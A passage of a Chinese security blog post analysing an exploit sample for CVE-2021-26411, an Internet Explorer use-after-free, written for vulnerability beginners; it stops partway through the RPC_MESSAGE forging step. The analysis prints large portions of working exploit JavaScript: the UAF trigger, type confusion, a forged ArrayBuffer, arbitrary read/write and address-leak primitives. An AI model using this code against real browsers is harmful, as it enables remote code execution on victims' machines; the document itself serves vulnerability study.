---
title: CVE-2021-26411 漏洞利用样本分析
url: https://www.anquanke.com/post/id/287394
source: 安全客-有思想的安全新媒体
date: 2023-03-16
fetch_date: 2025-10-04T09:42:13.570962
---

# CVE-2021-26411 漏洞利用样本分析

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# CVE-2021-26411 漏洞利用样本分析

阅读量**337177**

发布时间 : 2023-03-15 10:30:49

**x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![]()

## 样本信息

| 文件名 | in.php |
| --- | --- |
| MD5 | 56B8C44BB0B2B7EE31A766E1A77BAEDA |
| SHA1 | 95D643B3C7DA6AE209940A6F3722074A800282C0 |

## 概述

该样本是利用 CVE-2021-26411 漏洞进行攻击的 html 文件，攻击目标是 ie 和 edge 浏览器，其最终的目的是执行 shellcode 启动 powershell 进程进行下载行为。关于 CVE-2021-26411 漏洞的原因参考文章 【1】已经讲的比较精细，这里就不在赘述，简要描述是由于 Internet Explorer 的 mshtml 组件中存在一个释放后使用的缺陷。当用户访问了一个恶意页面时，会触发属性对象 nodeValue 的 valueOf 回调。在回调期间，手动调用 clearAttributes()，导致 nodeValue 保存的 BSTR 被提前释放。这样就会造成内存破坏和远程代码执行。关于利用方式参考文章【1】【2】讲的略微精简，所以决定在这里仔细分析一下以供像我这样的漏洞初学者参考。样本分析主要包括漏洞利用部分和 shellcode 部分。

## 分析环境

* Windows 10 x64 1607
* IE11，Windbg x86，IDA 7.5
* mshtml.dll(11.0.14393.0)，jscript9.dll(11.0.14393.0)

## 样本分析

样本的初始内容是一段混淆&加密的 js。

![]()

加密算法使用的是 AES(CBC)。

![]()

js 解密后的内容除去 shellcode 基本与参考文章【3】中公布的漏洞利用代码一致，只是做了一些精简。

![]()

### 漏洞利用分析

为了便于对利用原理的理解，我使用了参考文章【3】中的较规范的 js 代码进行分析。

#### 利用过程

1, 利用 CVE-2021-26411 的 UAF 造成类型混淆
2, 利用类型混淆泄露对象元数据，使用泄露对象的元数据伪造一个起始地址为 0，大小为 0xffffffff 的 ArrayBuffer 对象
3, 利用伪造的 ArrayBuffer 对象实现任意读写原语
4, 使用任意读原语实现任意对象地址泄露原语
5, 伪造 RPC\_MESSAGE 为任意函数调用做准备
6, bypass CFG
7, 执行 shellcode

#### 造成类型混淆

```
var god
var arr = [{}]
var fake = new ArrayBuffer(0x100)
var abf = new ArrayBuffer(0x20010)
var alloc = alloc2()
var hd0 = document.createAttribute('handle')
var hd1 = document.createAttribute('handle')
var hd2
var element = document.createElement('xxx')
var attr1 = document.createAttribute('yyy')
attr1.nodeValue = {
    valueOf: function() {
        hd1.nodeValue = (new alloc1()).nodeValue
        element.clearAttributes()
        hd2 = hd1.cloneNode()
        element.setAttribute('yyy', 1337)
    }
}
element.setAttributeNode(attr1)
element.setAttribute('zzz', '0'.repeat((0x20010 - 6) / 2))
element.removeAttributeNode(attr1)
hd0.nodeValue = alloc
```

```
element.removeAttributeNode(attr1)//触发 CVE-2021-26411 漏洞
```

执行 valueOf 的调用栈，执行重写 valueOf 的原因和 CVE-2016-0189 一样，均是需要进行类型转换。

![]()

element.removeAttributeNode(attr1) 开始时的 element，其中 attr2.nodeValue 是长度为 0x2000a 的 BSTR，为什么它占用的空间是 0x20010，是因为 BSTR 还包括字符串前长度为 4 字节的长度域和尾部 2字节的 \x00。

![]()

```
element.clearAttributes()//清除 AttributeArray 中的属性元素，释放 attr2.nodeValue 所占空间
```

element.clearAttributes() 结束后，AttributeArray 中的无效元素将被其最后一个元素 attr2.nodeValue 覆盖，而 attr2.nodeValue 所占空间也被释放，被释放的缘由是参考文章【1】【3】中提到的极长 BSTR (大于 0x8000)。

![]()

```
hd2 = hd1.cloneNode()
//重新占用 attr2.nodeValue(BSTR) 释放的内存空间，防止第一次 CBase::DeleteAt 时崩溃
```

hd2 = hd1.cloneNode() 结束后，原 attr2.nodeValue 所占空间将被重新占用，重新占用的目的有两个：

1, 为了避免在第一次 CBase::DeleteAt 删除 [2] attr1 时 CAttrValue::Free 释放无效内存而崩溃
2, 为了在 CAttrValue::Free 将其释放后继续持有这块内存的地址从而形成悬垂指针

![]()

```
element.setAttribute('yyy', 1337)
//避免第二次 CBase::DeleteAt 时崩溃
```

element.setAttribute(‘yyy’, 1337) 结束后，attr1.nodeValue 被重新设置，重新设置的目的是为了避免在第二次 CBase::DeleteAt 删除 [1] attr1.nodeValue 时对象解引用失败而崩溃。

![]()

element.removeAttributeNode(attr1) 结束后虽然 attr2.nodeValue(0874035c) 被释放，但是 hd2.nodeValue (BSTR)仍然持有这块内存的地址。

![]()

```
hd0.nodeValue = alloc
//重新占用 attr2.nodeValue(BSTR) 释放的内存空间
//这样 hd2.nodeValue 就和 hd0.nodeValue 占用相同的空间
```

hd0.nodeValue = alloc 结束后 attr2.nodeValue 将被 hd0.nodeValue 重新占用并且与 hd2.nodeValue 形成类型混淆。

hd0.nodeValue 类型值为 0xc safeArray。

![]()

hd2.nodeValue 类型值为 0x8 BSTR。

![]()

#### 泄露对象元数据，伪造 ArrayBuffer

```
var leak = new Uint32Array(dump(hd2.nodeValue))
var pAbf = leak[6]
var pArr = leak[10]
var VT_I4 = 0x3
var VT_DISPATCH = 0x9
var VT_BYREF = 0x4000
var bufArr = new Array(0x10)
var fakeArr = new Uint32Array(fake)
for (var i = 0; i < 0x10; ++i) setData(i + 1, new Data(VT_BYREF | VT_I4, pAbf + i * 4))
flush()
var ref = new VBArray(hd0.nodeValue)
for (var i = 0; i < 0x10; ++i) bufArr[i] = ref.getItem(i + 1)
ref = null
setData(1, new Data(VT_BYREF | VT_I4, bufArr[4]))
setData(2, new Data(VT_BYREF | VT_I4, bufArr[4] + 0x04))
setData(3, new Data(VT_BYREF | VT_I4, bufArr[4] + 0x1c))
flush()
ref = new VBArray(hd0.nodeValue)
var vt = ref.getItem(1)
var gc = ref.getItem(2)
var bs = ref.getItem(3)
ref = null
for (var i = 0; i < 16; ++i) fakeArr[i] = bufArr[i]
fakeArr[4] = bs + 0x40
fakeArr[16] = vt
fakeArr[17] = gc
fakeArr[24] = 0xffffffff
```

```
function dump(nv) {
    var ab = new ArrayBuffer(0x20010)
    var view = new DataView(ab)
    for (var i = 0; i < nv.length; ++i)
        view.setUint16(i * 2 + 4, nv.charCodeAt(i), true)
    return ab
}
var leak = new Uint32Array(dump(hd2.nodeValue))
var pAbf = leak[6]//fake
var pArr = leak[10]//arr
```

dump 函数以 hd2.nodeValue 为参数，使用 string 对象方法 charCodeAt 获取 hd2.nodeValue(0874035c) 处的数据，然后再以 uint32 视图泄露 fake 对象和 arr 对象的地址。

![]()

```
function Data(type, value) {
    this.type = type
    this.value = value
}
function setData(i, data) {
    var arr = new Uint32Array(abf)
    arr[i * 4] = data.type
    arr[i * 4 + 2] = data.value
}
for (var i = 0; i < 0x10; ++i) setData(i + 1, new Data(VT_BYREF | VT_I4, pAbf + i * 4))
```

setData 函数将 fake 对象的元数据的地址填充到 abf ArrayBuffer 中。

![]()

abf ArrayBuffer。

![]()

```
function flush() {
    hd1.nodeValue = (new alloc1()).nodeValue
    hd2.nodeValue = 0
    hd2 = hd1.cloneNode()
}
```

flush 函数再将 abf ArrayBuffer 中的数据刷新到 hd2.nodeValue(0874035c)。

![]()

```
var ref = new VBArray(hd0.nodeValue)
for (var i = 0; i < 0x10; ++i) bufArr[i] = ref.getItem(i + 1)
```

使用 hd0.nodeValue(safeArray) 泄露 fake 对象的元数据。

![]()

```
setData(1, new Data(VT_BYREF | VT_I4, bufArr[4]))//0892aea0
setData(2, new Data(VT_BYREF | VT_I4, bufArr[4] + 0x04))//0892aea4
setData(3, new Data(VT_BYREF | VT_I4, bufArr[4] + 0x1c))//0892aebc
flush()
ref = new VBArray(hd0.nodeValue)
var vt = ref.getItem(1)//vftable
var gc = ref.getItem(2)//dt
var bs = ref.getItem(3)//buffer
```

继续使用 hd0.nodeValue(safeArray) 泄露 fake.ArrayBuffer 的元数据。

![]()

```
for (var i = 0; i < 16; ++i) fakeArr[i] = bufArr[i]
fakeArr[4] = bs + 0x40
fakeArr[16] = vt
fakeArr[17] = gc
fakeArr[24] = 0xffffffff
```

使用泄露的 fake 对象的元数据在 fake.ArrayBuffer.buffer 中伪造对象，伪造的对象是一个起始地址为 0，大小为 0xffffffff 的 ArrayBuffer 对象。

![]()

#### 实现任意读写原语

```
setData(1, new Data(VT_DISPATCH, bs))
flush()
ref = new VBArray(hd0.nodeValue)
god = new DataView(ref.getItem(1))
```

使用伪造的 ArrayBuffer 对象实现任意读写对象 god。

![]()

以 god 对象实现任意读。

```
function read(addr, size) {
    switch (size) {
        case 8:
            return god.getUint8(addr)
        case 16:
            return god.getUint16(addr, true)
        case 32:
            return god.getUint32(addr, true)
    }
}
```

以 god 对象实现任意写。

```
function write(addr, value, size) {
    switch (size) {
        case 8:
            return god.setUint8(addr, value)
        case 16:
            return god.setUint16(addr, value, true)
        case 32:
            return god.setUint32(addr, value, true)
    }
}
```

#### 任意对象地址泄露原语

```
pArr = read(read(pArr + 0x10, 32) + 0x14, 32) + 0x10
function addrOf(obj) {
    arr[0] = obj
    return read(pArr, 32)
}
```

addrOf 将对象地址存储在 arr[0]，然后读取值。

![]()

#### 伪造 RPC\_MESSAGE

```
var map = new Map()
var jscript9 = getBase(read(addrOf(map), 32))
var rpcrt4 = getDllBase(jscript9, 'rpcrt4.dll')
var msvcrt = getDllBase(jscript9, 'msvcrt.dll')
var ntdll = getDllBase(msvcrt, 'ntdll.dll')
var kernelbase = getDllBase(msvcrt, 'kernelbase.dll')
var VirtualProtect = getProcAddr(kernelbase, 'VirtualProtect')
var LoadLibraryExA = getProcAddr(kernelbase, 'LoadLibraryExA')
var xyz = document.createAttribute('xyz')
var paoi = addrOf(xyz)
var patt = read(addrOf(xyz) + 0x18, 32)
var osf_vft = aos()
var msg = initRpc()
var rpcFree = rpcFree()
```

伪造 RPC\_MESSAGE 之前需要先调用 rpcrt4!I\_RpcTransServerNewConnection 以获得 OSF\_SCALL\_Vftable，OSF\_SCALL\_Vftable 最终将被设置到 RPC\_MESSAGE->Handle 中。而 I\_RpcTransServerNewConne...